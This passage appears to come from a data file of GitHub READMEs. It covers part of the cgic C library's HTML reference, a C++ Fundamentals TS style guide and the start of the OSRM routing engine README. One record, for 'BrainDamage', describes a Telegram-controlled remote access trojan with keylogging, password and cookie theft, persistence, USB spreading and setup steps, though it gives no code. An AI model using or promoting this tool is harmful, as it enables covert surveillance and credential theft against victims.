attempts to retrieve the integer sent for the\n  specified cookie (browser-side persistent storage). The value \n  pointed to by result will be set to the value submitted. \n  cgiCookieInteger() returns \n  cgiFormSuccess if the value was successfully retrieved,\n  cgiFormEmpty if the value submitted is an empty string,\n  cgiFormBadType if the value submitted is not an integer,\n  and <a href=\"#cgiFormNotFound\">cgiFormNotFound</a> if no such \n  input field was submitted. In the last three cases, the value \n  pointed to by result is set to the specified default.\n  See also <a href=\"#cgiCookieString\">cgiCookieString</a>,\n  <a href=\"#cgiCookies\">cgiCookies</a>,\n  <a href=\"#cgiHeaderCookieSetString>cgiHeaderCookieSetString</a>, and\n  <a href=\"#cgiHeaderCookieSetInteger>cgiHeaderCookieSetInteger</a>.\n<br><br><dt><strong><a name=\"cgiCookies\">cgiFormResultType cgiCookies(\n  char *name, char ***ptrToStringArray)</a>\n</strong><br><dd>cgiCookies is useful when the programmer cannot know the names\n  of all relevant cookies (browser-side persistent strings) in advance.\n  The value pointed to by result will be set to a pointer to an array \n  of strings; the last\n  entry in the array will be a null pointer.  This array is allocated \n  by the CGI library. Important: when done working with the array,\n  you must call cgiStringArrayFree() with the array pointer as the \n  argument. cgiCookies() returns <a href=\"#cgiFormSuccess\">cgiFormSuccess</a> except in the event of an out of memory error.\n  On success, ptrToStringArray is set to point to a \n  valid array of strings, with the last element in the array being a \n  null pointer; in the out-of-memory case ptrToStringArray is set to \n  a null pointer, and \n  <a href=\"#cgiFormOutOfMemory\">cgiFormOutOfMemory</a> is returned.\n<br><br><dt><strong><a name=\"cgiHtmlEscape\">\ncgiFormResultType cgiHtmlEscape(char *s)</a>\n</strong><br><dd>\ncgiHtmlEscape() outputs the specified null-terminated string to \n<a href=\"#cgiOut\">cgiOut</a>,\nescaping any &lt;, &amp;, and &gt; characters encountered correctly so that\nthey do not interfere with HTML markup. Returns \n<a href=\"#cgiFormSuccess\">cgiFormSuccess</a>, or\n<a href=\"#cgiFormIO\">cgiFormIO</a> in the event of an I/O error.\n<p> \n<br><br><dt><strong><a name=\"cgiHtmlEscapeData\">\ncgiFormResultType cgiHtmlEscapeData(char *data, int len)</a>\n</strong><br><dd>\ncgiHtmlEscapeData() is identical to <a href=\"#cgiHtmlEscape\">cgiHtmlEscape</a>,\nexcept that the data is not null-terminated. This version of the function\noutputs <code>len</code> bytes. See <a href=\"#cgiHtmlEscape\">cgiHtmlEscape</a>\nfor more information.\n<br><br><dt><strong><a name=\"cgiValueEscape\">\ncgiFormResultType cgiValueEscape(char *s)</a>\n</strong><br><dd>\ncgiValueEscape() outputs the specified null-terminated string to \n<a href=\"#cgiOut\">cgiOut</a>,\nescaping any \" characters encountered correctly so that\nthey do not interfere with the quotation marks of HTML attribute\nvalues. This is useful when outputting a string as part of the\nvalue attribute of an input tag, or the href attribute of a link\nor form tag. This function returns\n<a href=\"#cgiFormSuccess\">cgiFormSuccess</a>, or\n<a href=\"#cgiFormIO\">cgiFormIO</a> in the event of an I/O error.\n<p> \n<br><br><dt><strong><a name=\"cgiValueEscapeData\">\ncgiFormResultType cgiValueEscapeData(char *data, int len)</a>\n</strong><br><dd>\ncgiValueEscapeData() is identical to <a href=\"#cgiValueEscape\">cgiValueEscape</a>,\nexcept that the data is not null-terminated. This version of the function\noutputs <code>len</code> bytes. See <a href=\"#cgiValueEscape\">cgiValueEscape</a>\nfor more information.\n<br><br><dt><strong><a name=\"cgiWriteEnvironment\">\ncgiEnvironmentResultType cgiWriteEnvironment(char *filename)</a>\n</strong><br><dd>\ncgiWriteEnvironment() can\n  be used to write the entire CGI environment, including\n  form data, to the specified output file; <a href=\"#cgiReadEnvironment\">\n  cgiReadEnvironment()</a> \n  can then be used to restore that environment from the specified\n  input file for debugging. Of course, these will only work as expected\n  if you use the <a href=\"#variables\">cgic copies of the CGI environment \n  variables</a> and <a href=\"#cgiIn\">cgiIn</a> and \n  <a href=\"#cgiOut\">cgiOut</a> rather than stdin and\n  stdout (also see above). These functions are useful in order \n  to capture real CGI situations while the web server is running, then\n  recreate them in a debugging environment. Both functions\n  return <a href=\"#cgiEnvironmentSuccess\">cgiEnvironmentSuccess</a> on \n  success, <a href=\"#cgiEnvironmentIO\">cgiEnvironmentIO</a> on an I/O \n  error, and <a href=\"#cgiEnvironmentMemory\">cgiEnvironmentMemory</a>\n  on an out-of-memory error.\n<br><br><dt><strong><a name=\"cgiReadEnvironment\">\ncgiEnvironmentResultType cgiReadEnvironment(char *filename)</a>\n</strong><br><dd>\ncgiReadEnvironment() restores a CGI environment saved to the specified file by\n  <a href=\"#cgiWriteEnvironment\">cgiWriteEnvironment().</a> \n  Of course, these will only work as expected\n  if you use the <a href=\"#variables\">cgic copies of the CGI environment \n  variables</a> and <a href=\"#cgiIn\">cgiIn</a> and \n  <a href=\"#cgiOut\">cgiOut</a> rather than stdin and\n  stdout (also see above). These functions are useful in order \n  to capture real CGI situations while the web server is running, then\n  recreate them in a debugging environment. Both functions\n  return <a href=\"#cgiEnvironmentSuccess\">cgiEnvironmentSuccess</a> on success, \n  <a href=\"#cgiEnvironmentIO\">cgiEnvironmentIO</a> on an I/O error, and \n  <a href=\"#cgiEnvironmentMemory\">cgiEnvironmentMemory</a>\n  on an out-of-memory error.\n<br><br><dt><strong><a name=\"cgiMain\">int cgiMain()</a>\n</strong><br><dd><strong>The programmer must write this function</strong>, which performs \n  the unique task of the program and is invoked by the true main() \n  function, found in the cgic library itself. The return value from \n  cgiMain will be the return value of the program. It is expected that \n  the user will make numerous calls to the cgiForm functions\n  from within this function. See <a href=\"#howto\">how to write\n  a cgic application</a> for details.\n</dl>\n<h3><a name=\"variables\">cgic variable reference</a></h3>\nThis section provides a reference guide to the various global\nvariables provided by cgic for the programmer to utilize.\nThese variables should always be used in preference to\nstdin, stdout, and calls to getenv() in order to ensure\ncompatibility with the <a href=\"#debug\">cgic CGI debugging features</a>.\n<p>\nMost of these variables are equivalent to various CGI environment\nvariables. The most important difference is that the cgic\nenvironment string variables are never null pointers. They will always \npoint to valid C strings of zero or more characters.\n<dl>\n<br><dt><strong><a name=\"cgiServerSoftware\">char *cgiServerSoftware</a>\n</strong><br><dd>Points to the name of the server software,\nor to an empty string if unknown.\n<br><dt><strong><a name=\"cgiServerName\">char *cgiServerName</a>\n</strong><br><dd>Points to the name of the server,\nor to an empty string if unknown.\n<br><dt><strong><a name=\"cgiGatewayInterface\">char *cgiGatewayInterface</a>\n</strong><br><dd>Points to the name of the gateway interface (usually CGI/1.1),\nor to an empty string if unknown.\n<br><dt><strong><a name=\"cgiServerProtocol\">char *cgiServerProtocol</a>\n</strong><br><dd>Points to the protocol in use (usually HTTP/1.0),\nor to an empty string if unknown.\n<br><dt><strong><a name=\"cgiServerPort\">char *cgiServerPort</a>\n</strong><br><dd>Points to the port number on which the server is listening\nfor HTTP connections (usually 80), or an empty string if unknown.\n<br><dt><strong><a name=\"cgiRequestMethod\">char *cgiRequestMethod</a>\n</strong><br><dd>Points to the method used in the request (usually GET or POST),\nor an empty string if unknown (this should not happen).\n<br><dt><strong><a name=\"cgiPathInfo\">char *cgiPathInfo</a>\n</strong><br><dd>Most web servers recognize any additional path information in \nthe URL of the request beyond the name of the CGI program itself and\npass that information on to the program. cgiPathInfo points to this\nadditional path information.\n<br><dt><strong><a name=\"cgiPathTranslated\">char *cgiPathTranslated</a>\n</strong><br><dd>Most web servers recognize any additional path information in \nthe URL of the request beyond the name of the CGI program itself and\npass that information on to the program. cgiPathTranslated points\nto this additional path information, translated by the server into a \nfilesystem path on the local server.\n<br><dt><strong><a name=\"cgiScriptName\">char *cgiScriptName</a>\n</strong><br><dd>Points to the name under which the program was invoked.\n<br><dt><strong><a name=\"cgiQueryString\">char *cgiQueryString</a>\n</strong><br><dd>Contains any query information submitted by the user as a result\nof a GET-method form or an &lt;ISINDEX&gt; tag. Note that this\ninformation need not be parsed directly unless an &lt;ISINDEX&gt; tag\nwas used; normally it is parsed automatically by the cgic library. Use \nthe cgiForm family of functions to retrieve the values associated\nwith form input fields. See <a href=\"#howto\">how to write\na cgic application</a> for more information.\n<br><dt><strong><a name=\"cgiRemoteHost\">char *cgiRemoteHost</a>\n</strong><br><dd>Points to the fully resolved hostname of the browser, if known,\nor an empty string if unknown.\n<br><dt><strong><a name=\"cgiRemoteAddr\">char *cgiRemoteAddr</a>\n</strong><br><dd>Points to the dotted-decimal IP address of the browser, if known,\nor an empty string if unknown.\n<br><dt><strong><a name=\"cgiAuthType\">char *cgiAuthType</a>\n</strong><br><dd>Points to the type of authorization used for the request,\nif any, or an empty string if none or unknown.\n<br><dt><strong><a name=\"cgiRemoteUser\">char *cgiRemoteUser</a>\n</strong><br><dd>Points to the user name under which the user has \nauthenticated; an empty string if no authentication has\ntaken place. The certainty of this information depends on\nthe type of authorization in use; see\n<a href=\"#cgiAuthType\">cgiAuthType</a>.\n<br><dt><strong><a name=\"cgiRemoteIdent\">char *cgiRemoteIdent</a>\n</strong><br><dd>Points to the user name volunteered by the user via\nthe user identification protocol; an empty\nstring if unknown. This information is not secure.\nIdentification demons can be installed by users on\ninsecure systems such as Windows machines.\n<br><dt><strong><a name=\"cgiContentType\">char *cgiContentType</a>\n</strong><br><dd>Points to the MIME content type of the information\nsubmitted by the user, if any; an empty string if no\ninformation was submitted. If this string is equal to\n<code>application/x-www-form-urlencoded</code> or\n<code>multipart/form-data</code>, the cgic\nlibrary will automatically examine the form data submitted.\nIf this string has any other non-empty value, a different\ntype of data has been submitted. This is currently very rare,\nas most browsers can only submit forms and file uploads which\ncgic parses directly.\n<br><dt><strong><a name=\"cgiContentType\">char *cgiCookie</a>\n</strong><br><dd>Points to the raw cookie (browser-side persistent storage)\ndata submitted by the web browser. \nProgrammers should use the functions <a href=\"#cgiCookies\">cgiCookies</a>,\n<a href=\"#cgiCookieString\">cgiCookieString</a> and\n<a href=\"#cgiCookieInteger\">cgiCookieInteger</a> instead of\nexamining this string directly.\n<br><dt><strong><a name=\"cgiAccept\">char *cgiAccept</a>\n</strong><br><dd>Points to a space-separated list of MIME content types\nacceptable to the browser (see <a href=\"#cgiHeaderContentType\">\ncgiHeaderContentType()</a> ), or an empty string. Unfortunately, this variable\nis not supplied in a useful form by most current browsers. Programmers wishing\nto make decisions based on the capabilities of the browser\nare advised to check the <a href=\"#cgiUserAgent\">cgiUserAgent</a>\nvariable against a list of browsers and capabilities instead.\n<br><dt><strong><a name=\"cgiUserAgent\">char *cgiUserAgent</a>\n</strong><br><dd>\nPoints to the name of the browser in use, or an empty\nstring if this information is not available. \n<br><dt><strong><a name=\"cgiReferrer\">char *cgiReferrer</a>\n</strong><br><dd>\nPoints to the URL of the previous page visited by the user. This is\noften the URL of the form that brought the user to your program.\nNote that reporting this information is entirely up to the browser,\nwhich may choose not do so, and may choose not to do so truthfully.\nHowever, this variable is typically accurate. <strong>The frequently\nused misspelling cgiReferer is also supplied as a macro.</strong>\n<br><dt><strong><a name=\"cgiContentLength\">int cgiContentLength</a>\n</strong><br><dd>The number of bytes of form or query data received.\n  Note that if the submission is a form or query submission\n  the library will read and parse all the information\n  directly from cgiIn and/or cgiQueryString. The programmer should\n  not do so, and indeed the cgiIn pointer will be at end-of-file\n  in such cases.\n<br><dt><strong><a name=\"cgiOut\">FILE *cgiOut</a>\n</strong><br><dd>Pointer to CGI output. The cgiHeader functions, such as\n  <a href=\"#cgiHeaderContentType\">cgiHeaderContentType</a>, should \n  be used first to output the mime headers; the output HTML\n  page, GIF image or other web document should then be written\n  to cgiOut by the programmer using standard C I/O functions\n  such as fprintf() and fwrite(). cgiOut is normally equivalent\n  to stdout; however, it is recommended that cgiOut be used to\n  ensure compatibility with future versions of cgic for\n  specialized environments.\n<br><dt><strong><a name=\"cgiIn\">FILE *cgiIn</a>\n</strong><br><dd>Pointer to CGI input. In 99.99% of cases, you will not \n  need this. CGIC 2.0 supports both regular POST form submissions\n  and multipart/form-data file upload form submissions directly.\n</dl>\n<H3><a name=\"resultcodes\">cgic result code reference</a></h3>\n<p>\nIn most cases, cgic functions are designed to produce reasonable results\neven when browsers and users do unreasonable things. However, it is sometimes\nimportant to know precisely which unreasonable things took place, especially\nwhen assigning a default value or bounding a value is an inadequate\nsolution. The following result codes are useful in making this determination.\n<dl>\n<br><dt><strong><a name=\"cgiFormSuccess\">cgiFormSuccess</a>\n</strong><br><dd>Indicates that the function successfully performed at least one\naction (or retrieved at least one value, where applicable).\n<br><dt><strong><a name=\"cgiFormTruncated\">cgiFormTruncated</a>\n</strong><br><dd>Indicates that a string value retrieved from the user was\ncut short to avoid overwriting the end of a buffer.\n<br><dt><strong><a name=\"cgiFormBadType\">cgiFormBadType</a>\n</strong><br><dd>Indicates that a \"numeric\" value submitted by the user was\nin fact not a legal number.\n<br><dt><strong><a name=\"cgiFormEmpty\">cgiFormEmpty</a>\n</strong><br><dd>Indicates that a field was retrieved but contained no data.\n<br><dt><strong><a name=\"cgiFormNotFound\">cgiFormNotFound</a>\n</strong><br><dd>Indicates that no value was submitted for a particular field.\n<br><dt><strong><a name=\"cgiFormConstrained\">cgiFormConstrained</a>\n</strong><br><dd>Indicates that a numeric value was beyond the specified bounds\nand was forced to the lower or upper bound as appropriate.\n<br><dt><strong><a name=\"cgiFormNoSuchChoice\">cgiFormNoSuchChoice</a>\n</strong><br><dd>Indicates that the value submitted for a single-choice field\n(such as a radio-button group) was not one of the acceptable values.\nThis usually indicates a discrepancy between the form and the program.\n<br><dt><strong><a name=\"cgiFormEOF\">cgiFormEOF</a>\n</strong><br><dd>Returned by <a href=\"#cgiFormFileRead\">cgiFormFileRead</a>\nwhen, at the start of the call, the cgiFilePtr object is already\npositioned at the end of the uploaded file data. \n<br><dt><strong><a name=\"cgiFormEOF\">cgiFormIO</a>\n</strong><br><dd>Returned by <a href=\"#cgiFormFileRead\">cgiFormFileRead</a>\nwhen an I/O error occurs while reading uploaded file data.\n<br><dt><strong><a name=\"cgiFormNotAFile\">cgiFormNotAFile</a>\n</strong><br><dd>Returned in response to an attempt to manipulate a form field\nthat is not a file upload field using a file-related function.\n<br><dt><strong><a name=\"cgiFormNoContentType\">cgiFormNoContentType</a>\n</strong><br><dd>Returned in response to an attempt to fetch the content type of\na file-upload field when the content type is not specified by the browser.\n<br><dt><strong><a name=\"cgiFormNoFileName\">cgiFormNoFileName</a>\n</strong><br><dd>Returned in response to an attempt to fetch the file name of\na file-upload field when a file name is not specified by the browser.\n<br><dt><strong><a name=\"cgiFormOpenFailed\">cgiFormOpenFailed</a>\n</strong><br><dd>Returned in response to an attempt to read from a null\ncgiFilePtr object, typically when the programmer has failed to\ncheck the result of a call to <a href=\"#cgiFormFileOpen\">cgiFormFileOpen</a>.\n<br><dt><strong><a name=\"cgiEnvironmentMemory\">cgiEnvironmentMemory</a>\n</strong><br><dd>Indicates that an attempt to read or write the CGI environment\nto or from a capture file failed due to an out-of-memory error.\n<br><dt><strong><a name=\"cgiEnvironmentSuccess\">cgiEnvironmentSuccess</a>\n</strong><br><dd>Indicates that an attempt to read or write the CGI environment\nto or from a capture file was successful.\n<br><dt><strong><a name=\"cgiEnvironmentIO\">cgiEnvironmentIO</a>\n</strong><br><dd>Indicates that an attempt to read or write the CGI environment\nto or from a capture file failed due to an I/O error. \n<br><dt><strong><a name=\"cgiEnvironmentWrongVersion\">cgiEnvironmentWrongVersion</a>\n</strong><br><dd>Indicates that an attempt to read from a saved debugging CGI environment\nproduced by a pre-2.0 version of CGIC was made. \n</dl>\n<h3><a name=\"index\">cgic quick index</a></h3>\n<a href=\"#cgiAccept\">cgiAccept</a> |\n<a href=\"#cgiAuthType\">cgiAuthType</a> |\n<a href=\"#cgiContentLength\">cgiContentLength</a> |\n<a href=\"#cgiContentType\">cgiContentType</a> |\n<a href=\"#cgiEnvironmentIO\">cgiEnvironmentIO</a> |\n<a href=\"#cgiEnvironmentMemory\">cgiEnvironmentMemory</a> |\n<a href=\"#cgiEnvironmentSuccess\">cgiEnvironmentSuccess</a> |\n<a href=\"#cgiCookieInteger\">cgiCookieInteger</a> |\n<a href=\"#cgiCookies\">cgiCookies</a> |\n<a href=\"#cgiCookieSetInteger\">cgiCookieSetInteger</a> |\n<a href=\"#cgiCookieSetString\">cgiCookieSetString</a> |\n<a href=\"#cgiCookieString\">cgiCookieString</a> |\n<a href=\"#cgiHtmlEscape\">cgiHtmlEscape</a> |\n<a href=\"#cgiHtmlEscapeData\">cgiHtmlEscapeData</a> |\n<a href=\"#cgiValueEscape\">cgiValueEscape</a> |\n<a href=\"#cgiValueEscapeData\">cgiValueEscapeData</a> |\n<a href=\"#cgiFormBadType\">cgiFormBadType</a> |\n<a href=\"#cgiFormCheckboxMultiple\">cgiFormCheckboxMultiple()</a> |\n<a href=\"#cgiFormCheckboxSingle\">cgiFormCheckboxSingle()</a> |\n<a href=\"#cgiFormConstrained\">cgiFormConstrained</a> |\n<a href=\"#cgiFormDouble\">cgiFormDouble()</a> |\n<a href=\"#cgiFormDoubleBounded\">cgiFormDoubleBounded()</a> |\n<a href=\"#cgiFormEOF\">cgiFormEOF</a> |\n<a href=\"#cgiFormEmpty\">cgiFormEmpty</a> |\n<a href=\"#cgiFormEntries\">cgiFormEntries</a> |\n<a href=\"#cgiFormFileClose\">cgiFormFileClose</a> |\n<a href=\"#cgiFormFileContentType\">cgiFormFileContentType</a> |\n<a href=\"#cgiFormFileName\">cgiFormFileName</a> |\n<a href=\"#cgiFormFileOpen\">cgiFormFileOpen</a> |\n<a href=\"#cgiFormFileRead\">cgiFormFileRead</a> |\n<a href=\"#cgiFormFileSize\">cgiFormFileSize</a> |\n<a href=\"#cgiFormInteger\">cgiFormInteger()</a> |\n<a href=\"#cgiFormIntegerBounded\">cgiFormIntegerBounded()</a> |\n<a href=\"#cgiFormNoContentType>cgiFormNoContentType</a> |\n<a href=\"#cgiFormNoFileName>cgiFormNoFileName</a> |\n<a href=\"#cgiFormNoSuchChoice\">cgiFormNoSuchChoice</a> |\n<a href=\"#cgiFormNotAFile>cgiFormNotAFile</a> |\n<a href=\"#cgiFormNotFound\">cgiFormNotFound</a> |\n<a href=\"#cgiFormRadio\">cgiFormRadio()</a> |\n<a href=\"#cgiFormSelectMultiple\">cgiFormSelectMultiple()</a> |\n<a href=\"#cgiFormSelectSingle\">cgiFormSelectSingle()</a> |\n<a href=\"#cgiFormString\">cgiFormString()</a> |\n<a href=\"#cgiFormStringMultiple\">cgiFormStringMultiple()</a> |\n<a href=\"#cgiFormStringNoNewlines\">cgiFormStringNoNewlines()</a> |\n<a href=\"#cgiFormStringSpaceNeeded\">cgiFormStringSpaceNeeded()</a> |\n<a href=\"#cgiFormSuccess\">cgiFormSuccess</a> |\n<a href=\"#cgiFormTruncated\">cgiFormTruncated</a> |\n<a href=\"#cgiGatewayInterface\">cgiGatewayInterface</a> |\n<a href=\"#cgiHeaderContentType\">cgiHeaderContentType()</a> |\n<a href=\"#cgiHeaderLocation\">cgiHeaderLocation()</a> |\n<a href=\"#cgiHeaderStatus\">cgiHeaderStatus()</a> |\n<a href=\"#cgiIn\">cgiIn</a> |\n<a href=\"#cgiMain\">cgiMain()</a>\n<a href=\"#cgiOut\">cgiOut</a> |\n<a href=\"#cgiPathInfo\">cgiPathInfo</a> |\n<a href=\"#cgiPathTranslated\">cgiPathTranslated</a> |\n<a href=\"#cgiQueryString\">cgiQueryString</a> |\n<a href=\"#cgiReadEnvironment\">cgiReadEnvironment()</a> |\n<a href=\"#cgiReferrer\">cgiReferrer()</a> |\n<a href=\"#cgiRemoteAddr\">cgiRemoteAddr</a> |\n<a href=\"#cgiRemoteHost\">cgiRemoteHost</a> |\n<a href=\"#cgiRemoteIdent\">cgiRemoteIdent</a> |\n<a href=\"#cgiRemoteUser\">cgiRemoteUser</a> |\n<a href=\"#cgiRequestMethod\">cgiRequestMethod</a> |\n<a href=\"#cgiScriptName\">cgiScriptName</a> |\n<a href=\"#cgiServerName\">cgiServerName</a> |\n<a href=\"#cgiServerPort\">cgiServerPort</a> |\n<a href=\"#cgiServerProtocol\">cgiServerProtocol</a> |\n<a href=\"#cgiServerSoftware\">cgiServerSoftware</a> |\n<a href=\"#cgiStringArrayFree\">cgiStringArrayFree()</a> |\n<a href=\"#cgiUserAgent\">cgiUserAgent</a> |\n<a href=\"#cgiWriteEnvironment\">cgiWriteEnvironment()</a>\n"}, {"repo": "/mehulj94/BrainDamage", "language": "Python", "readme_contents": "# BrainDamage\nA python based remote administration tool which uses [Telegram](https://telegram.org/) as C&C server.\n\n<pre>\n                           /\\\n                          /_.\\\n                    _,.-'/ `\",\\'-.,_\n                 -~^    /______\\`~~-^~:\n\n  ____            _       _____                                   \n |  _ \\          (_)     |  __ \\                                  \n | |_) |_ __ __ _ _ _ __ | |  | | __ _ _ __ ___   __ _  __ _  ___ \n |  _ <| '__/ _` | | '_ \\| |  | |/ _` | '_ ` _ \\ / _` |/ _` |/ _ \\\n | |_) | | | (_| | | | | | |__| | (_| | | | | | | (_| | (_| |  __/\n |____/|_|  \\__,_|_|_| |_|_____/ \\__,_|_| |_| |_|\\__,_|\\__, |\\___|\n                                                        __/ |     \n                                                       |___/      \n\n--> Coded by: Mehul Jain(mehulj94@gmail.com)\n--> Github: https://github.com/mehulj94\n--> Twitter: https://twitter.com/_b00geyman_\n--> For windows only\n\n  ______         _                       \n |  ____|       | |                      \n | |__ ___  __ _| |_ _   _ _ __ ___  ___ \n |  __/ _ \\/ _` | __| | | | '__/ _ \\/ __|\n | | |  __/ (_| | |_| |_| | | |  __/\\__ \\\n |_|  \\___|\\__,_|\\__|\\__,_|_|  \\___||___/\n                                         \n\n--> Persistance\n--> USB spread\n--> Port Scanner\n--> Router Finder\n--> Run shell commands\n--> Keys logging\n--> Insert keystrokes\n--> Record audio\n--> Webserver\n--> Screenshot logging\n--> Download files in the host\n--> Execute shutdown, restart, logoff, lock\n--> Send drive tree structure\n--> Set email template\n--> Rename Files\n--> Change wallpaper\n--> Open website\n--> Send Password for\n    \u2022 Chrome\n    \u2022 Mozilla\n    \u2022 Filezilla\n    \u2022 Core FTP\n    \u2022 CyberDuck\n    \u2022 FTPNavigator\n    \u2022 WinSCP\n    \u2022 Outlook\n    \u2022 Putty\n    \u2022 Skype\n    \u2022 Generic Network\n--> Cookie stealer\n--> Send active windows\n--> Gather system information\n    \u2022 Drives list\n    \u2022 Internal and External IP\n    \u2022 Ipconfig /all output\n    \u2022 Platform\n</pre>\n\n# Setup\n* Telegram setup:\n  * Install [Telegram](https://telegram.org/) app and search for \"BOTFATHER\".\n  * Type /help to see all possible commands.\n  * Click on or type /newbot to create a new bot.\n  * Name your bot.\n  * You should see a new API token generated for it.\n* Dedicated Gmail account. Remember to check \"allow connection from less secure apps\" in gmail settings.\n* Set access_token in eclipse.py to token given by the botfather.\n* Set CHAT_ID in eclipse.py. Send a message from the app and use the telegram api to get this chat id.\n\n> bot.getMe() will give output {'first_name': 'Your Bot', 'username': 'YourBot', 'id': 123456789}\n\n* Set copied_startup_filename in Eclipse.py.\n* Set Gmail password and Username in /Breathe/SendData.py\n\n\n# Abilities\n* whoisonline- list active slaves\n> This command will list all the active slaves.\n\n* destroy- delete&clean up\n> This command will remove the stub from host and will remove registry entries.\n\n* cmd- execute command on CMD\n> Run shell commands on host\n\n* download- url (startup, desktop, default)\n> This will download files in the host computer.\n\n* execute- shutdown, restart, logoff, lock\n> Execute the following commands\n\n* screenshot- take screenshot\n> Take screenshot of the host of computer.\n\n* send- passwords, drivetree, driveslist, keystrokes, openwindows\n> This command will sends passwords (saved browser passwords, FTP, Putty..), directory tree of host (upto level 2), logged keystrokes and windows which are currently open\n\n* set- email (0:Default,1:URL,2:Update), filename (0: Itself, 1: Others), keystrokes (text)\n> This command can set email template (default, download from url, update current template with text you'll send), rename filenames or insert keystrokes in host.\n\n* start- website (URL), keylogger, recaudio (time), webserver (Port), spread\n> This command can open website, start keylogger, record audio, start webserver, USB Spreading\n\n* stop- keylogger, webserver\n> This command will stop keylogger or webserver\n\n* wallpaper- change wallpaper (URL)\n> Changes wallpaper of host computer\n\n* find- openports (host, threads, ports), router\n> This command will find open ports and the router the host is using\n\n* help- print this usage\n\n# Requirements\n* [Telepot](https://github.com/nickoala/telepot)\n* [PyAudio](https://people.csail.mit.edu/hubert/pyaudio/)\n* [PyCrypto](http://www.voidspace.org.uk/python/modules.shtml#pycrypto)\n* [Pyasn1](https://pypi.python.org/pypi/pyasn1)\n* [Pillow](https://pillow.readthedocs.io/en/latest/installation.html)\n* Install [PyHook](https://sourceforge.net/projects/pyhook/)\n* Install [PyWin32](https://sourceforge.net/projects/pywin32/)\n* Install [Microsoft Visual C++ Compiler for Python](https://www.microsoft.com/en-us/download/details.aspx?id=44266)\n* Install [PyInstaller](http://www.pyinstaller.org/)\n\n# Screenshots\n\n![Setup](https://image.ibb.co/mkWNRF/Capture.png)\n\n![Notification](https://image.ibb.co/kCey0a/IMG_0009.jpg)\n\n![Who is Online Telegram](https://image.ibb.co/f20GmF/IMG_0006.jpg)\n\n![Help Telegram](https://image.ibb.co/bZHJ0a/IMG_0004.jpg)\n\n![Record Audio Telegram](https://image.ibb.co/dA3fDv/IMG_0005.jpg)\n\n![Take screenshot Telegram](https://image.ibb.co/buPntv/IMG_0007.jpg)\n\n# For educational purposes only, use at your own responsibility.\n\n"}, {"repo": "/cplusplus/fundamentals-ts", "language": "HTML", "readme_contents": "fundamentals-ts\n===============\n\nThe draft C++ Library Fundamentals Technical Specification.\n\nThe draft can be viewed online at: https://cplusplus.github.io/fundamentals-ts/\n\nThis TS is written using a set of [custom HTML elements](https://github.com/cplusplus/html-doc-framework)\nbased on the [Polymer framework](http://www.polymer-project.org/).\n\n\nStyle guide\n-----------\n\nThis guide is intended to produce results compatible with the main C++\nstandard, which is written in LaTeX.\n\nLook for applicable [`<cxx-*>` elements](https://github.com/cplusplus/html-doc-framework),\nand write semantic markup according to http://developers.whatwg.org/.\n\nGenerally use `<code>` rather than `<samp>`, `<kbd>`, `<tt>` or other\nmonospacing elements. `<samp>` could be useful for sample compiler\nerror messages.  Don't use `<kbd>` for code a user might enter: that's\njust `<code>`.\n\nUse `<em>` for emphasis and `<i>` for text in another \"voice\", like\ncomments and technical terms.  `<dfn>` is good for the defining\ninstance of a term, but not for subsequent uses. I may add a\n`<cxx-term>` element to call out uses of technical terms specifically,\nwhich will enable automatic cross-linking and indexing.\n\nUse `<var>` for variables. There's tension between using it for all\nvariables, including function parameters, and only calling out\nmeta-variables used in documentation.  I'm leaning toward only\nmeta-variables, since marking up parameters requires a huge number of\ntags, which make it harder to read the source, and there's not much\nreason to italicize normal variables.  Most meta-variables will end up\nmarked up as `<code><var>meta-variable</var></code>`.\n\nVery little text is bold, either with `<strong>` or `<b>`.\n\nAny repeated markup structure should be abstracted out into a custom\nelement in the https://github.com/cplusplus/html-doc-framework project.\n\n\nNamespace formatting\n--------------------\n\nNamespace contents are indented by 2 spaces, with one blank line\nbetween the namespace open and the first line of the contents.\nMultiple namespaces can be opened at the same indentation level, like:\n\n```c++\nnamespace std {\nnamespace experimental {\n\n  class contents{};\n\n} // namespace experimental\n} // namespace std\n```\n\nNamespaces are only shown in header synopses, not around class or\nfunction definitions.\n"}, {"repo": "/Project-OSRM/osrm-backend", "language": "C++", "readme_contents": "## Open Source Routing Machine\n\n| Linux / macOS | Windows | Code Coverage |\n| ------------- | ------- | ------------- |\n| [![Travis](https://travis-ci.org/Project-OSRM/osrm-backend.png?branch=master)](https://travis-ci.org/Project-OSRM/osrm-backend) | [![AppVeyor](https://ci.appveyor.com/api/projects/status/4iuo3s9gxprmcjjh)](https://ci.appveyor.com/project/DennisOSRM/osrm-backend) | [![Codecov](https://codecov.io/gh/Project-OSRM/osrm-backend/branch/master/graph/badge.svg)](https://codecov.io/gh/Project-OSRM/osrm-backend) |\n\nHigh performance routing engine written in C++14 designed to run on OpenStreetMap data.\n\nThe following services are available via HTTP API, C++ library interface and NodeJs wrapper:\n- Nearest - Snaps coordinates to the street network and returns the nearest matches\n- Route - Finds the fastest route between coordinates\n- Table - Computes the duration or distances of the fastest route between all pairs of supplied coordinates\n- Match - Snaps noisy GPS traces to the road network in the most plausible way\n- Trip - Solves the Traveling Salesman Problem using a greedy heuristic\n- Tile - Generates Mapbox Vector Tiles with internal routing metadata\n\nTo quickly try OSRM use our [demo server](http://map.project-osrm.org) which comes with both the backend and a frontend on top.\n\nFor a quick introduction about how the road network is represented in OpenStreetMap and how to map specific road network features have a look at [this guide about mapping for navigation](https://www.mapbox.com/mapping/mapping-for-navigation/).\n\nRelated [Project-OSRM](https://github.com/Project-OSRM) repositories:\n- [osrm-frontend](https://github.com/Project-OSRM/osrm-frontend) - User-facing frontend with map. The demo server runs this on top of the backend\n- [osrm-text-instructions](https://github.com/Project-OSRM/osrm-text-instructions) - Text instructions from OSRM route response\n- [osrm-backend-docker](https://hub.docker.com/r/osrm/osrm-backend/) - Ready to use Docker images\n\n## Documentation\n\n### Full documentation\n\n- [Hosted documentation](http://project-osrm.org)\n- [osrm-routed HTTP API documentation](docs/http.md)\n- [libosrm API documentation](docs/libosrm.md)\n\n## Contact\n\n- IRC: `irc.oftc.net`, channel: `#osrm` ([Webchat](https://webchat.oftc.net))\n- Mailinglist: `https://lists.openstreetmap.org/listinfo/osrm-talk`\n\n## Quick Start\n\nThe easiest and quickest way to setup your own routing engine is to use Docker images we provide.\n\nThere are two pre-processing pipelines available:\n- Contraction Hierarchies (CH)\n- Multi-Level Dijkstra (MLD)\n\nwe recommend using MLD by default except for special use-cases such as very large distance matrices where CH is still a better fit for the time being.\nIn the following we explain the MLD pipeline.\nIf you want to use the CH pipeline instead replace `osrm-partition` and `osrm-customize` with a single `osrm-contract` and change the algorithm option for `osrm-routed` to `--algorithm ch`.\n\n### Using 